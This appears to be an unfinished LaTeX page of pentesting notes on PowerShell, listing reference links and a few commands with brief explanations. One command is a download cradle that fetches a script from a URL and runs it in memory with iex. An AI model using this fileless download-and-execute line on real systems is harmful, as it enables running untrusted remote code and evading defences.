

\section{to re-organize}
\subsection{Transcript}
\url{https://devblogs.microsoft.com/powershell/powershell-the-blue-team/}

\url{https://docs.microsoft.com/en-us/powershell/scripting/learn/remoting/running-remote-commands?view=powershell-7.2}


\url{https://book.hacktricks.xyz/windows-hardening/basic-powershell-for-pentesters}

\url{https://docs.microsoft.com/en-us/powershell/scripting/learn/ps101/00-introduction?view=powershell-7.2}
\subsection{Commands}

Lists available modules loaded for use.
\begin{verbatim}
Get-Module 
\end{verbatim}


Return environment values such as key paths, users, computer information, etc.
\begin{verbatim}
Get-ChildItem Env: | ft Key,Value 
\end{verbatim}

Download a file from the web using PowerShell and call it from memory.

\begin{verbatim}
powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('URL'); `
    <follow-on commands>" 
\end{verbatim}


add a .NET framework class to our PowerShell session (i\verb+AssemblyName+
parameter allows to specify an assembly that contains types needed)

\begin{verbatim}
Add-Type -AssemblyName System.IdentityModel
\end{verbatim}




